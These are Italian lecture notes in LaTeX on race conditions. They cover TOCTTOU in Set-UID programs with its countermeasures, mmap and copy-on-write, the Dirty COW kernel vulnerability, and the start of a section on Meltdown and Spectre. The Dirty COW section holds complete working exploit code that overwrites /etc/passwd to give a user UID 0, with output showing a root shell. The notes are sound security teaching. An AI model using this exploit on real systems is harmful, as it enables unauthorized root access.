\section{Race condition}

Una Race Condition si verifica quando due o più processi/thread accedono contemporaneamente a una risorsa condivisa e il risultato finale dipende dall'ordine di esecuzione, che non è prevedibile né controllabile.

Se un programma privilegiato presenta una condizione di
competizione, gli aggressori potrebbero essere in grado di
influenzare l'output del programma privilegiato influenzando gli
eventi incontrollabili.

Quando due thread di esecuzione simultanei accedono a una risorsa
condivisa in un modo che produce involontariamente risultati diversi a
seconda della tempistica dei thread o dei processi

\subsection*{TOCTTOU – Time-Of-Check To Time-Of-Use}

Il TOCTTOU è un tipo speciale di Race Condition che si verifica quando intercorre un intervallo di tempo tra il momento in cui viene effettuato un controllo su una risorsa e il momento in cui quella risorsa viene effettivamente utilizzata.

Durante questa finestra temporale, un attaccante può modificare lo stato della risorsa dopo che il controllo è già avvenuto con esito positivo, ma prima che venga utilizzata. Il programma quindi opera su qualcosa di diverso da ciò che aveva verificato, con conseguenze potenzialmente gravi.

Es: un programma privilegiato controlla che un file sia sicuro, ma prima di aprirlo un attaccante lo sostituisce con un file dannoso. Il programma utilizzerà il file malevolo, credendo di aver già verificato la sua sicurezza.


Consideriamo un programma Set-UID (bit di un file eseguibile se attivato, chiunque lo lanci lo esegue con i privilegi del proprietario del file) di proprietà di root, in cui l'UID 
effettivo è root e l'ID dell'utente reale è \texttt{seed}. Il programma 
scrive in un file nella directory \texttt{/tmp}, scrivibile da tutti gli 
utenti del sistema.

l'utente seed lancia il programma, ma poiché esso è Set-UID root, il sistema operativo lo esegue come se fosse root. Quando open() apre il file, guarda l'UID effettivo (root = 0) e concede l'accesso a qualsiasi file del sistema, indipendentemente da chi lo abbia avviato.

\begin{figure}[h]
    \centering
    \includegraphics[width=0.6\textwidth]{immagini/2.png}
\end{figure}

Poiché root può scrivere su qualsiasi file, il programma deve prima 
verificare che sia l'utente reale ad avere i permessi necessari sul file 
di destinazione. A questo scopo viene utilizzata la funzione 
\texttt{access()}, che controlla se l'ID utente reale dispone dei 
permessi di scrittura su \texttt{/tmp/X}.

Tuttavia, tra il momento in cui \texttt{access()} effettua il controllo 
e il momento in cui \texttt{open()} apre il file in scrittura, esiste una 
finestra temporale. La funzione \texttt{open()} non controlla l'ID 
dell'utente reale, bensì quello effettivo, che è 0 (root), quindi il file 
verrà aperto indipendentemente da chi sia il proprietario effettivo del 
file in quel momento.

Un attaccante può sfruttare questa finestra temporale: dopo che 
\texttt{access()} ha verificato il file originale con esito positivo, ma 
prima che \texttt{open()} lo apra, è possibile sostituire \texttt{/tmp/X} 
con un link simbolico che punta a un file di sistema protetto, come ad 
esempio \texttt{/etc/passwd}. Il programma, eseguendosi con i privilegi 
di root, scriverà su quel file senza alcuna ulteriore verifica, 
compromettendo l'integrità del sistema.

\subsection*{Contromisure}

\begin{itemize}
	\item Operazioni atomiche : eliminare la finestra tra controllo e utilizzo
	\item Controllo e utilizzo ripetuti: per rendere difficile vincere la “gara”.
	\item Collegamento simbolico sticky anche se la directory è scrivibile da tutti, un utente può creare o eliminare solo i propri file
	\item Protezione: per impedire la creazione di collegamenti simbolici.
	\item Principi del privilegio minimo: prevenire i danni dopo che la gara è stata vinta dall'attaccante. Es. un programma non dovrebbe mantenere i privilegi di root per tutta la sua esecuzione, ma elevarli solo nel momento in cui servono e rilasciarli subito dopo.
\end{itemize}

\textbf{Operazioni atomiche}

Un primo approccio concreto utilizza i flag \texttt{O\_CREAT | O\_EXCL} 
combinati nella chiamata \texttt{open()}:

\begin{verbatim}
f = open(file, O_CREAT | O_EXCL);
\end{verbatim}

Questi due flag insieme istruiscono \texttt{open()} ad aprire il file 
solo se non esiste già: in caso contrario, l'operazione fallisce. 
Poiché controllo e apertura avvengono nella stessa chiamata di sistema, 
il kernel garantisce l'atomicità dell'intera operazione, senza lasciare 
alcuna finestra temporale sfruttabile dall'attaccante.

Un secondo approccio, puramente teorico, immagina l'esistenza di un flag 
\texttt{O\_REAL\_USER\_ID}:

\begin{verbatim}
f = open(file, O_WRITE | O_REAL_USER_ID);
\end{verbatim}

Questo flag istruirebbe \texttt{open()} a verificare i permessi 
utilizzando l'UID reale anziché quello effettivo, affidando a una singola 
chiamata sia il controllo che l'utilizzo. 

\textbf{Controllo e utilizzo ripetuti}

Un secondo approccio consiste nel ripetere più volte la sequenza di 
controllo e utilizzo all'interno dello stesso programma. Come mostrato 
nel codice, il ciclo \texttt{access()} e \texttt{open()} viene eseguito 
tre volte, producendo tre file descriptor \texttt{fd1}, \texttt{fd2} e 
\texttt{fd3}. Al termine, il programma verifica tramite \texttt{fstat()} 
che i tre file descriptor puntino allo stesso inode:

\begin{figure}[h]
    \centering
    \includegraphics[width=0.6\textwidth]{immagini/3.png}
\end{figure}

\begin{figure}[h]
    \centering
    \includegraphics[width=0.6\textwidth]{immagini/4.png}
\end{figure}


\begin{verbatim}
if(stat1.st_ino == stat2.st_ino && stat2.st_ino == stat3.st_ino) {
    write_to_file(fd1);
}
\end{verbatim}

Se gli inode non coincidono, significa che il file è stato modificato 
durante l'esecuzione e l'operazione viene bloccata. Per portare a termine 
un attacco riuscito, l'attaccante dovrebbe riuscire a sostituire 
\texttt{/tmp/XYZ} esattamente in ognuna delle cinque finestre temporali 
disponibili tra i vari controlli e aperture. La probabilità di riuscire 
a vincere la gara cinque volte consecutive è drasticamente inferiore 
rispetto a un programma con una sola condizione di competizione. Questa 
contromisura non elimina teoricamente la vulnerabilità, ma la rende 
nella pratica estremamente difficile da sfruttare.

\textbf{Protezione permanente dei collegamenti simbolici}

I sistemi Linux moderni offrono una protezione permanente contro l'abuso 
dei collegamenti simbolici nelle directory scrivibili da tutti, come 
\texttt{/tmp}. Quando questa protezione è abilitata, un collegamento 
simbolico all'interno di una directory scrivibile da tutti può essere 
seguito solo se il proprietario del collegamento coincide con l'utente 
che lo sta seguendo, oppure con il proprietario della directory stessa. 
Questo impedisce all'attaccante di creare un link simbolico malevolo 
che punti a file di sistema protetti, poiché il programma privilegiato 
non sarà autorizzato a seguirlo.

\begin{figure}[h]
    \centering
    \includegraphics[width=0.6\textwidth]{immagini/5.png}
\end{figure}



Nel programma vulnerabile analizzato, l'UID effettivo del processo è root 
e la directory \texttt{/tmp} è anch'essa di proprietà di root. Con la 
protezione dei collegamenti simbolici abilitata, il sistema operativo 
permette di seguire un symlink solo quando il proprietario del collegamento 
corrisponde all'UID effettivo del processo che lo vuole seguire, oppure al 
proprietario della directory in cui si trova.

Nel nostro scenario, un attaccante con utente \texttt{seed} che crea un 
collegamento simbolico in \texttt{/tmp} ne diventa il proprietario. Quando 
il programma privilegiato tenta di seguirlo, il sistema confronta il 
proprietario del link (\texttt{seed}) con l'EID del processo (root) e con 
il proprietario di \texttt{/tmp} (root): nessuna delle due condizioni è 
soddisfatta, quindi l'accesso viene negato. L'unico modo per creare un 
collegamento simbolico che il programma possa seguire sarebbe che fosse 
root stesso a crearlo, rendendo di fatto impossibile lo sfruttamento della 
vulnerabilità da parte di un utente non privilegiato.

\subsection*{Contromisura: Principio del Privilegio Minimo}

Il principio del privilegio minimo stabilisce che un programma non 
dovrebbe mai utilizzare più privilegi di quelli strettamente necessari 
all'operazione che sta svolgendo. Nel programma vulnerabile analizzato, 
il processo gira con EID root per tutta la sua esecuzione, anche durante 
operazioni che non richiedono privilegi elevati, come l'apertura di un 
file in \texttt{/tmp}.

La soluzione consiste nel ridurre temporaneamente i privilegi subito 
prima di aprire il file, impostando l'EID uguale al RID tramite 
\texttt{seteuid()}:

\begin{verbatim}
uid_t real_uid = getuid();
uid_t eff_uid  = geteuid();
seteuid(real_uid);           // EID diventa seed
f = open("/tmp/X", O_WRITE);
seteuid(eff_uid);            // EID ripristinato a root
\end{verbatim}

In questo modo, nel momento in cui \texttt{open()} viene eseguita, il 
processo ha i privilegi dell'utente reale e non di root. Anche se 
l'attaccante fosse riuscito a sostituire \texttt{/tmp/X} con un 
collegamento simbolico a un file di sistema protetto come 
\texttt{/etc/passwd}, l'apertura fallirebbe perché l'utente 
\texttt{seed} non dispone dei permessi necessari. I privilegi di root 
vengono ripristinati solo al termine dell'operazione, se necessari per 
le fasi successive del programma.

\subsection*{Mappatura della memoria con \texttt{mmap()}}

\texttt{mmap()} è una chiamata di sistema che consente di mappare file o dispositivi direttamente in memoria. Il tipo di mappatura predefinito è la \textbf{mappatura supportata da file} (\textit{file-backed mapping}): mappa un'area della memoria virtuale di un processo su un file, in modo che la lettura dall'area mappata corrisponda alla lettura del file.

\subsection{Struttura del codice}

Di seguito un esempio completo di utilizzo di \texttt{mmap()}:

\begin{lstlisting}[language=C, caption={Esempio di memory mapping con mmap()}]
int main()
{
    struct stat st;
    char content[20];
    char *new_content = "New Content";
    void *map;

    // (1) Apre il file in modalita' lettura-scrittura
    int f = open("./zzz", O_RDWR);
    fstat(f, &st);

    // (2) Mappa l'intero file in memoria
    map = mmap(NULL, st.st_size, PROT_READ | PROT_WRITE,
               MAP_SHARED, f, 0);

    // (3) Legge 10 byte dal file tramite la memoria mappata
    memcpy((void*)content, map, 10);
    printf("read: %s\n", content);

    // (4) Scrive nel file tramite la memoria mappata
    memcpy(map + 5, new_content, strlen(new_content));

    // Pulizia
    munmap(map, st.st_size);
    close(f);
    return 0;
}
\end{lstlisting}

\subsection*{Argomenti di \texttt{mmap()}}

La chiamata alla riga 2 ha la seguente firma:
\begin{center}
\texttt{void *mmap(void *addr, size\_t length, int prot, int flags, int fd, off\_t offset);}
\end{center}

\begin{enumerate}
    \item \textbf{Indirizzo iniziale} (\texttt{addr}): indirizzo di partenza per la memoria mappata. Se \texttt{NULL}, il kernel sceglie automaticamente l'indirizzo.
    \item \textbf{Dimensione} (\texttt{length}): dimensione in byte della regione di memoria da mappare.
    \item \textbf{Protezione} (\texttt{prot}): specifica se la memoria è leggibile e/o scrivibile (\texttt{PROT\_READ}, \texttt{PROT\_WRITE}). Deve essere compatibile con la modalità di apertura del file alla riga 1.
    \item \textbf{Flag} (\texttt{flags}): determina se le modifiche alla mappatura sono visibili ad altri processi che mappano la stessa regione e se le modifiche vengono propagate al file sottostante (\texttt{MAP\_SHARED} o \texttt{MAP\_PRIVATE}).
    \item \textbf{File descriptor} (\texttt{fd}): il file che deve essere mappato in memoria.
    \item \textbf{Offset} (\texttt{offset}): indica da quale posizione all'interno del file deve iniziare la mappatura.
\end{enumerate}

\subsection*{Accesso tramite \texttt{memcpy()}}

Una volta creata la mappatura, è possibile accedere al file con semplici operazioni di lettura e scrittura tramite \texttt{memcpy()}:
\begin{itemize}
    \item Riga 3: legge 10 byte dal file tramite la memoria mappata.
    \item Riga 4: scrive nel file tramite la memoria mappata, a partire dall'offset 5.
\end{itemize}


\subsubsection*{\texttt{MAP\_SHARED}}

La memoria mappata si comporta come \textbf{memoria condivisa} tra i processi.

\begin{itemize}
    \item Quando più processi mappano lo stesso file, possono utilizzare indirizzi di memoria \emph{virtuale} diversi.
    \item L'indirizzo di memoria \emph{fisica} in cui viene conservato il contenuto del file è però \textbf{lo stesso} per tutti i processi.
    \item Le modifiche effettuate da un processo sono immediatamente visibili agli altri e vengono propagate al file su disco.
\end{itemize}

    \centering

\subsubsection*{\texttt{MAP\_PRIVATE}}

Il file viene mappato nella \textbf{memoria privata} del processo chiamante, con semantica \textit{copy-on-write}:

\begin{itemize}
    \item Le modifiche apportate alla memoria \textbf{non sono visibili} agli altri processi.
    \item Inizialmente, la memoria virtuale del processo punta alla stessa memoria fisica della copia principale (nessuna copia immediata).
    \item Quando il processo tenta di \textbf{scrivere} nella memoria mappata, il sistema operativo:
        \begin{enumerate}
            \item alloca un nuovo blocco di memoria fisica;
            \item copia il contenuto dalla copia principale al nuovo blocco (\textit{copy-on-write});
            \item redirige la memoria virtuale del processo verso il nuovo blocco fisico.
        \end{enumerate}
    \item Le modifiche \textbf{non vengono propagate} al file sottostante.
\end{itemize}

\subsection*{Copy-on-Write (CoW)}

La tecnica \textbf{Copy-on-Write} (CoW) consente alla memoria virtuale di diversi processi di mapparsi alle stesse pagine di memoria fisica, quando queste hanno contenuti identici.

Quando un processo figlio viene creato tramite la chiamata di sistema \texttt{fork()}:
\begin{itemize}
    \item Il sistema operativo consente al processo figlio di \textbf{condividere la memoria} del processo padre, facendo in modo che le voci della tabella delle pagine puntino alla stessa memoria fisica.
    \item Se la memoria viene \textbf{solo letta}, non è necessaria alcuna copia.
    \item Se un processo tenta di \textbf{scrivere} nella memoria condivisa, viene sollevata un'eccezione e il sistema operativo:
    \begin{enumerate}
        \item Alloca un nuovo blocco di memoria fisica per il processo figlio (\textit{pagina sporca}).
        \item Copia il contenuto dal processo genitore al nuovo blocco.
        \item Modifica la tabella delle pagine di ciascun processo (genitore e figlio) in modo che ognuno punti alla propria copia privata.
    \end{enumerate}
\end{itemize}

\subsection*{Eliminare la memoria copiata: \texttt{madvise()}}

\begin{lstlisting}[language=C]
int madvise(void *addr, size_t length, int advice)
\end{lstlisting}

La funzione \texttt{madvise()} fornisce consigli o indicazioni al kernel riguardo alla memoria compresa tra \texttt{addr} e \texttt{addr + length}.

Il terzo argomento \texttt{advice} può assumere il valore \texttt{MADV\_DONTNEED}:
\begin{itemize}
    \item Segnala al kernel che la regione di memoria indicata \textbf{non è più necessaria}.
    \item Il kernel libera le risorse fisiche associate a quell'indirizzo.
    \item La tabella delle pagine del processo viene aggiornata in modo da puntare nuovamente alla \textbf{memoria fisica originale} (pre-CoW).
    \item Di conseguenza, tutte le modifiche effettuate sulla copia privata vengono \textbf{scartate}.
\end{itemize}

\subsection*{Mappatura di file di sola lettura}


Consideriamo un file \texttt{/zzz} nella directory principale, di proprietà di \texttt{root} e leggibile dagli altri utenti:

\begin{lstlisting}[language=bash]
$ ls -ld zzz
-rw-r--r-- 1 root root 6447 Nov  8 16:25 zzz
$ cat /zzz
1111111111111111111111111111
\end{lstlisting}

Se si dispone di un account utente non privilegiato (\texttt{seed}):
\begin{itemize}
    \item Il file può essere aperto \textbf{solo in lettura} (\texttt{O\_RDONLY}).
    \item La mappatura in memoria deve usare il flag \texttt{PROT\_READ}: la memoria risulta quindi di \textbf{sola lettura}.
    \item Normalmente non è possibile scrivere in questa memoria.
    \item Tuttavia, se il file viene mappato con \texttt{MAP\_PRIVATE}, il sistema operativo fa un'eccezione e \textbf{consente la scrittura}, ma tramite un percorso alternativo: invece di operazioni dirette in memoria (come \texttt{memcpy()}), si utilizza la chiamata di sistema \texttt{write()} attraverso il filesystem \texttt{/proc}.
\end{itemize}

\subsection*{Il codice}

\begin{lstlisting}[language=C, caption={Mapping read-only di un file con CoW}]
int main(int argc, char *argv[])
{
    char *content = "**New content**";
    char buffer[30];
    struct stat st;
    void *map;

    // Apre il file in sola lettura
    int f = open("/zzz", O_RDONLY);
    fstat(f, &st);

    // (1) Mappa /zzz in memoria di sola lettura con MAP_PRIVATE
    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);

    // (2) Apre il pseudo-file di memoria del processo tramite /proc
    int fm = open("/proc/self/mem", O_RDWR);

    // (3) Sposta il puntatore al quinto byte dall'inizio della memoria mappata
    lseek(fm, (off_t) map + 5, SEEK_SET);

    // (4) Scrive nella memoria (attiva il meccanismo Copy-on-Write)
    write(fm, content, strlen(content));

    // Verifica che la scrittura sia avvenuta con successo
    memcpy(buffer, map, 29);
    printf("Content after write: %s\n", buffer);

    // (5) Comunica al kernel che la copia privata non e' piu' necessaria
    madvise(map, st.st_size, MADV_DONTNEED);

    memcpy(buffer, map, 29);
    printf("Content after madvise: %s\n", buffer);
}
\end{lstlisting}


\begin{itemize}
    \item \textbf{Riga 1}: Mappa \texttt{/zzz} in memoria di sola lettura con \texttt{MAP\_PRIVATE}. Non è possibile scrivere direttamente in memoria, ma è possibile farlo indirettamente tramite il filesystem.
    
    \item \textbf{Riga 2}: Tramite il filesystem \texttt{/proc}, un processo può usare \texttt{read()}, \texttt{write()} e \texttt{lseek()} per accedere alla propria memoria. Il file \texttt{/proc/self/mem} è lo pseudo-file che rappresenta lo spazio di memoria del processo corrente.
    
    \item \textbf{Riga 3}: La chiamata \texttt{lseek()} sposta il puntatore del file al \textbf{5° byte} dall'inizio della regione di memoria mappata.
    
    \item \textbf{Riga 4}: La chiamata \texttt{write()} scrive la stringa \texttt{"**New content**"} nella memoria. Questo percorso \textbf{attiva il meccanismo Copy-on-Write}: il sistema operativo crea una copia privata della pagina e la scrittura avviene su di essa. Il file originale \textbf{non viene modificato}.
    
    \item \textbf{Riga 5}: \texttt{madvise()} con \texttt{MADV\_DONTNEED} segnala al kernel che la copia privata non è più necessaria. La tabella delle pagine viene reindirizzata alla \textbf{memoria mappata originale}, annullando le modifiche alla copia privata.
\end{itemize}

\subsection*{Risultato dell'esecuzione}

\begin{lstlisting}[language=bash]
$ gcc cow_map_readonly_file.c
$ a.out
Content after write:   11111**New content**111111111
Content after madvise: 1111111111111111111111111111
$ cat /zzz
1111111111111111111111111111
\end{lstlisting}

\begin{itemize}
    \item \textbf{Dopo la scrittura}: la memoria mappata mostra il contenuto modificato, poiché la scrittura ha agito sulla \textbf{copia privata} (CoW).
    \item \textbf{Dopo \texttt{madvise()}}: il contenuto torna a quello originale, poiché la copia privata viene scartata e la tabella delle pagine punta di nuovo alla memoria fisica originale.
    \item \textbf{Il file \texttt{/zzz} non è mai stato modificato}: le modifiche riguardano esclusivamente la copia in memoria del processo.
\end{itemize}


\subsection*{La vulnerabilità Dirty COW}

Come visto in precedenza, quando un processo tenta di scrivere in una memoria mappata con \texttt{MAP\_PRIVATE}, il sistema operativo esegue tre passi fondamentali:

\begin{enumerate}[label=(\Alph*)]
    \item \textbf{Crea una copia} della pagina di memoria mappata (nuova memoria fisica).
    \item \textbf{Aggiorna la tabella delle pagine}, in modo che la memoria virtuale del processo punti alla nuova memoria fisica appena creata.
    \item \textbf{Scrive nella memoria} (sulla copia privata).
\end{enumerate}

Questi tre passi \textbf{non sono atomici}: possono essere interrotti da altri thread. Questa non-atomicità crea una \textbf{race condition} che costituisce la base della vulnerabilità \textbf{Dirty COW} (CVE-2016-5195).

\subsection*{Come viene sfruttata la race condition}

Se la chiamata \texttt{madvise()} con \texttt{MADV\_DONTNEED} viene eseguita da un altro thread \textbf{tra il passo B e il passo C}, si verifica la seguente sequenza critica:

\begin{enumerate}
    \item Il \textbf{passo B} aggiorna la tabella delle pagine: la memoria virtuale punta alla copia privata 2.
    \item \texttt{madvise()} \textbf{annulla il passo B}: la tabella delle pagine viene riportata a puntare alla memoria originale 1.
    \item Il \textbf{passo C} scrive nella memoria fisica puntata dalla tabella delle pagine, che ora è 1 (la memoria originale, condivisa col file), invece della copia privata.
    \item Le modifiche alla memoria 1 vengono \textbf{propagate al file sottostante}, causando la modifica di un file di sola lettura da parte di un utente non privilegiato.
\end{enumerate}

\begin{figure}[H]
    \centering
    \includegraphics[width=0.9\textwidth]{immagini/13.png}
\end{figure}


\noindent\textbf{Nota importante:} quando viene avviata la chiamata di sistema \texttt{write()}, il kernel verifica la protezione della memoria mappata. Quando rileva che si tratta di memoria CoW, attiva i passi A, B, C senza effettuare un secondo controllo (\textit{double-check}) sullo stato aggiornato della tabella delle pagine. Questo è il difetto fondamentale.

\subsection*{Idea di base dell'attacco}

Per sfruttare la vulnerabilità è necessario eseguire \textbf{due thread in competizione}:

\begin{itemize}
    \item \textbf{Thread 1 (write thread)}: scrive continuamente nella memoria mappata tramite \texttt{write()} su \texttt{/proc/self/mem}.
    \item \textbf{Thread 2 (madvise thread)}: scarta continuamente la copia privata della memoria mappata tramite \texttt{madvise(..., MADV\_DONTNEED)}.
\end{itemize}

I due thread vengono messi in competizione finché la loro interazione non produce la scrittura sulla memoria originale (e quindi sul file sottostante).

\subsection*{Caso pratico: attacco a \texttt{/etc/passwd}}

\texttt{/etc/passwd} è un file di sola lettura per gli utenti non privilegiati. La struttura di un record è la seguente:

\begin{lstlisting}[language=bash]
$ cat /etc/passwd | grep testcow
testcow:x:1001:1003:,,,:~/home/testcow:/bin/bash
\end{lstlisting}

\begin{itemize}
    \item \textbf{Campo 1} --- \texttt{testcow}: username dell'utente.
    \item \textbf{Campo 2} --- \texttt{x}: la password è salvata in forma hash nel file \texttt{/etc/shadow}.
    \item \textbf{Campo 3} --- \texttt{1001}: \textbf{UID} (User ID), identificatore numerico dell'utente. L'utente \texttt{root} ha sempre UID = 0.
    \item \textbf{Campo 4} --- \texttt{1003}: \textbf{GID} (Group ID), gruppo primario dell'utente.
    \item \textbf{Campo 5} --- \texttt{,,,}: campo \textbf{GECOS}, informazioni opzionali come nome completo e numero di telefono, qui lasciate vuote.
    \item \textbf{Campo 6} --- \texttt{/home/testcow}: percorso della \textbf{home directory}.
    \item \textbf{Campo 7} --- \texttt{/bin/bash}: \textbf{shell} assegnata all'utente al momento del login.
\end{itemize}

Il \textbf{terzo campo} rappresenta lo \textbf{User ID (UID)}. L'utente \texttt{root} ha UID = 0. L'obiettivo dell'attacco è modificare il record di \texttt{testcow} sostituendo \texttt{1001} con \texttt{0000}, trasformando di fatto l'utente in root.

\subsection*{Il codice dell'attacco}

\subsubsection*{Thread principale (\texttt{main})}

Il thread principale si occupa di configurare la mappatura della memoria e di lanciare i due thread:

\begin{lstlisting}[language=C, caption={Thread principale dell'attacco Dirty COW}]
void *map;

int main(int argc, char *argv[])
{
    pthread_t pth1, pth2;
    struct stat st;
    int file_size;

    // Apre il file /etc/passwd in sola lettura
    int f = open("/etc/passwd", O_RDONLY);

    // Mappa il file in memoria COW con MAP_PRIVATE
    fstat(f, &st);
    file_size = st.st_size;
    map = mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);

    // (1) Trova la posizione del record target nel file mappato
    char *position = strstr(map, "testcow:x:1001"); // (1)

    // (2) Crea il thread madvise (scarta la copia privata)
    pthread_create(&pth1, NULL, madviseThread, (void *)file_size); // (2)

    // (3) Crea il thread write (scrive nella memoria mappata)
    pthread_create(&pth2, NULL, writeThread, position); // (3)

    // Attende la fine dei thread
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);
    return 0;
}
\end{lstlisting}

\begin{itemize}
    \item \textbf{Riga 1}: individua la posizione esatta nella memoria mappata in cui si trova il record dell'utente \texttt{testcow}.
    \item \textbf{Riga 2}: crea il thread che chiama ripetutamente \texttt{madvise()} per annullare la copia privata.
    \item \textbf{Riga 3}: crea il thread che tenta ripetutamente di scrivere nella memoria tramite \texttt{/proc/self/mem}.
\end{itemize}

\subsubsection*{I due thread}

\begin{lstlisting}[language=C, caption={writeThread e madviseThread}]
void *writeThread(void *arg)
{
    char *content = "testcow:x:0000";
    off_t offset = (off_t) arg;

    // Apre lo pseudo-file di memoria del processo
    int f = open("/proc/self/mem", O_RDWR);

    while (1) {
        // Sposta il puntatore alla posizione del record target
        lseek(f, offset, SEEK_SET);
        // Scrive nella memoria (tenta di attivare la race condition)
        write(f, content, strlen(content));
    }
}

void *madviseThread(void *arg)
{
    int file_size = (int) arg;

    while (1) {
        // Scarta la copia privata, riportando la tabella
        // delle pagine alla memoria originale
        madvise(map, file_size, MADV_DONTNEED);
    }
}
\end{lstlisting}

\begin{itemize}
    \item \textbf{writeThread}: tenta in loop di sovrascrivere \texttt{"testcow:x:1001"} con \texttt{"testcow:x:0000"} nella memoria del processo tramite \texttt{/proc/self/mem}.
    \item \textbf{madviseThread}: chiama in loop \texttt{madvise()} per annullare continuamente la copia privata, sperando di intercettarsi tra i passi B e C di \texttt{write()}.
\end{itemize}

\subsection*{Risultato dell'attacco}

\begin{lstlisting}[language=bash]
seed@ubuntu:$ gcc cow_attack_passwd.c -lpthread
seed@ubuntu:$ a.out
   ... press Ctrl-C after a few seconds ...
seed@ubuntu:$ cat /etc/passwd | grep testcow
testcow:x:0000:1003:,,,:~/home/testcow:/bin/bash   <- UID diventa 0!
seed@ubuntu:$ su testcow
Password:
root@ubuntu:#   <- Shell di root ottenuta!
root@ubuntu:# id
uid=0(root) gid=1003(testcow) groups=0(root),1003(testcow)
\end{lstlisting}

Grazie alla race condition, la scrittura \textbf{bypassa il meccanismo CoW} e modifica direttamente il file \texttt{/etc/passwd} (di sola lettura), cambiando l'UID di \texttt{testcow} da \texttt{1001} a \texttt{0}. L'utente può quindi eseguire \texttt{su testcow} e ottenere una \textbf{shell con privilegi di root}.



\section{Meltdown e Spectre}


\textbf{Meltdown} e \textbf{Spectre} sono i soprannomi assegnati a tre gravi vulnerabilità hardware scoperte nel 2017:

\begin{itemize}
    \item \textbf{Variant 1} --- Bounds Check Bypass (CVE-2017-5753) $\rightarrow$ \textit{Spectre}
    \item \textbf{Variant 2} --- Branch Target Injection (CVE-2017-5715) $\rightarrow$ \textit{Spectre}
    \item \textbf{Variant 3} --- Rogue Data Cache Load (CVE-2017-5754) $\rightarrow$ \textit{Meltdown}
\end{itemize}

Le varianti 1 e 2 costituiscono \textbf{Spectre}, mentre la variante 3 costituisce \textbf{Meltdown}.

\subsection*{Sistemi vulnerabili}

Le vulnerabilità colpiscono la maggior parte dei moderni processori, server e dispositivi mobili (inclusi gli Apple SoC):

\begin{itemize}
    \item \textbf{Meltdown}: processori Intel, ARM, IBM su desktop, laptop e cloud.
    \item \textbf{Spectre}: processori Intel, AMD, ARM, IBM su desktop, laptop, cloud server e smartphone.
    \item Entrambe le vulnerabilità sono indipendenti dal sistema operativo: colpiscono Linux, Windows, macOS e altri.
\end{itemize}

\subsection*{Cosa attaccano}

\begin{itemize}
    \item \textbf{Meltdown}: rompe l'isolamento fondamentale tra le applicazioni utente e il sistema operativo. Permette a un programma di accedere alla memoria, e quindi ai segreti, di altri programmi e del kernel.
    
    \item \textbf{Spectre}: rompe l'isolamento tra diverse applicazioni. Consente a un attaccante di ingannare programmi privi di errori, inducendoli a divulgare informazioni riservate, anche se questi seguono le migliori pratiche di sicurezza.
\end{itemize}


Entrambi gli attacchi sfruttano tre caratteristiche dei moderni processori:

\begin{enumerate}
    \item \textbf{Out-of-Order Execution} (esecuzione fuori ordine)
    \item \textbf{Speculative Execution} (esecuzione speculativa)
    \item \textbf{Caching} (memorizzazione nella cache)
\end{enumerate}

Entrambi gli attacchi utilizzano un \textbf{canale laterale} (\textit{side channel}) per ricavare informazioni dagli accessi in memoria effettuati dalla CPU durante l'esecuzione fuori ordine o speculativa.

\subsection*{Out-of-Order Execution}

L'\textbf{esecuzione fuori ordine} è un paradigma di elaborazione che consente ai microprocessori ad alte prestazioni di iniziare l'esecuzione di un'istruzione non appena i suoi operandi sono disponibili, indipendentemente dall'ordine originale del programma.

\begin{itemize}
    \item Le istruzioni vengono \textit{emesse} in ordine, ma possono essere \textit{eseguite} in ordine diverso.
    \item L'obiettivo è evitare gli \textbf{stalli} (\textit{stalls}) che si verificano quando i dati necessari per un'operazione non sono ancora disponibili.
\end{itemize}

I passi dell'esecuzione fuori ordine sono i seguenti:

\begin{enumerate}
    \item \textbf{Fetch}:  Recupero delle istruzioni dalla memoria.
    \item \textbf{Dispatch}: Invio delle istruzioni a una coda (chiamato anche buffer o prenotazione di istruzioni).
    \item \textbf{Attesa}:  L'istruzione attende in coda finché i suoi operandi di ingresso non sono disponibili. L'istruzione 
può quindi lasciare la coda
    \item \textbf{Esecuzione}:  L'istruzione viene impartita all'unità funzionale appropriata ed eseguita da tale unità
    \item \textbf{Accodamento risultati}:  I risultati vengono messi in coda
    \item \textbf{Commit}: Solo dopo che tutte le istruzioni più vecchie hanno riscritto i risultati nel file di registro, questo 
risultato viene riscritto nel file di registro.
\end{enumerate}

\subsection*{Speculative Execution}

L'\textbf{esecuzione speculativa} è una tecnica usata dalle moderne CPU per migliorare le prestazioni: il processore esegue alcune operazioni \textit{in anticipo}, ipotizzando che saranno necessarie.

\begin{itemize}
    \item Se l'ipotesi è \textbf{corretta}: si ottiene un'accelerazione, poiché il lavoro è già completato.
    \item Se l'ipotesi è \textbf{errata}: le modifiche vengono annullate e i risultati vengono scartati.
\end{itemize}

Il problema di sicurezza nasce dal fatto che, anche quando i risultati speculativi vengono annullati, gli \textbf{effetti collaterali} sulla cache della CPU possono rimanere osservabili.

\subsection*{Caching}

La \textbf{cache} è una memoria ad accesso molto rapido che la CPU utilizza per ridurre i tempi di accesso alla memoria principale (RAM). Il suo funzionamento si basa su due principi fondamentali:

\begin{itemize}
    \item \textbf{Località temporale}: un dato a cui si è acceduto di recente è probabile che venga richiesto di nuovo a breve (es. un contatore in un ciclo).
    \item \textbf{Località spaziale}: un dato vicino a uno già acceduto è probabile che venga richiesto presto (es. elementi consecutivi di un array).
\end{itemize}

La differenza di tempo tra un accesso in cache (\textit{cache hit}) e un accesso in RAM (\textit{cache miss}) è alla base del \textbf{side channel} utilizzato da Meltdown e Spectre: misurando il tempo di accesso a specifiche locazioni di memoria, un attaccante può dedurre quali indirizzi sono stati caricati in cache durante l'esecuzione speculativa, rivelando così informazioni riservate.


\subsection*{Side Channel Attack}

Un \textbf{attacco side channel} non prende di mira direttamente un programma o il suo codice sorgente. Piuttosto, tenta di raccogliere informazioni o influenzare l'esecuzione di un programma \textbf{misurando o sfruttando gli effetti indiretti} del sistema o del suo hardware.

In altre parole, un attacco side channel viola la crittografia sfruttando informazioni \textbf{trapelate involontariamente} dal sistema durante la sua normale esecuzione. Le principali tipologie sono:

\begin{itemize}
    \item \textbf{Attacco a tempo} (\textit{Timing Attack}): analizza il tempo impiegato da un sistema per eseguire algoritmi crittografici.
    \item \textbf{Attacco elettromagnetico} (\textit{EM Attack}): misura e analizza la radiazione elettromagnetica emessa da un dispositivo durante l'elaborazione.
    \item \textbf{Simple Power Analysis (SPA)}: osserva direttamente le variazioni di potenza ed elettromagnetiche di un sistema crittografico durante le operazioni.
    \item \textbf{Differential Power Analysis (DPA)}: ottiene e analizza misurazioni statistiche dettagliate su più operazioni per ricavare chiavi crittografiche.
